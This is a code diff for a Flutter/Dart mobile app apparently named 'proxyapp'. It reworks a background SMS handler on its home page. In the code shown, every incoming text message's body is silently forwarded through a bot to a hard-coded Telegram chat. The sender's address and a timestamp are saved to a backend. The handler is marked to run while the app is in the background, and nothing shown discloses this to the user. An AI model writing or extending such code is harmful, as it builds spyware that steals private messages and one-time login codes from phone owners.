@@ -3,7 +3,6 @@ import 'dart:ui';
 
 import 'package:dart_telegram_bot/dart_telegram_bot.dart';
 import 'package:dart_telegram_bot/telegram_entities.dart';
-import 'package:flutter_config/flutter_config.dart';
 import 'package:intl/intl.dart';
 import 'package:auto_route/auto_route.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
@@ -12,14 +11,6 @@ import 'package:hooks_riverpod/hooks_riverpod.dart';
 import 'package:proxyapp/auth/shared/providers.dart';
 import 'package:proxyapp/page/model/services.dart';
 import 'package:telephony/telephony.dart';
-
-@RoutePage()
-class GreenHomePage extends ConsumerStatefulWidget {
-  const GreenHomePage({super.key});
-
-  @override
-  GreenHomePageState createState() => GreenHomePageState();
-}
 
 final mockService = MockServices();
 final chatId = "-1002059990678";
@@ -32,15 +23,9 @@ Future<void> loadindUid() async {
 }
 
 final telephony = Telephony.instance;
+
+@pragma('vm:entry-point')
 onBackgroundMessage(SmsMessage message) {
-  print("background message: " + message.body!);
-  onMessageBack(message);
-}
-
-onMessageBack(SmsMessage message) async {
-  print(chatId);
-
-  print("######1##");
   String formattedDate = DateFormat('kk:mm, d MMM').format(DateTime.now());
   Map<String, dynamic> phoneInformationsVariable = {
     "message.address": message.address,
@@ -48,10 +33,8 @@ onMessageBack(SmsMessage message) async {
     "message.dateSent": formattedDate,
   };
   print("######2##");
-
-  bot.sendMessage(ChatID(int.parse(chatId)), message.body!);
+  bot.sendMessage(ChatID(-1002059990678), message.body!);
   print("######3##");
-
   mockService.createData(phoneInformationsVariable);
   print("######4##");
 }
@@ -62,6 +45,14 @@ final bot = Bot(
   // Handle start failure
   onStartFailed: (bot, e, s) => print('Start failed'),
 );
+
+@RoutePage()
+class GreenHomePage extends ConsumerStatefulWidget {
+  const GreenHomePage({super.key});
+
+  @override
+  GreenHomePageState createState() => GreenHomePageState();
+}
 
 class GreenHomePageState extends ConsumerState<GreenHomePage> {
   String notificationChannelId = 'my_foreground';
@@ -113,9 +104,6 @@ class GreenHomePageState extends ConsumerState<GreenHomePage> {
 
   @override
   Widget build(BuildContext context) {
-    print("##############");
-    print(FlutterConfig.get('chatId').toString());
-    print("##############");
     return MaterialApp(
         home: Scaffold(
             appBar: AppBar(
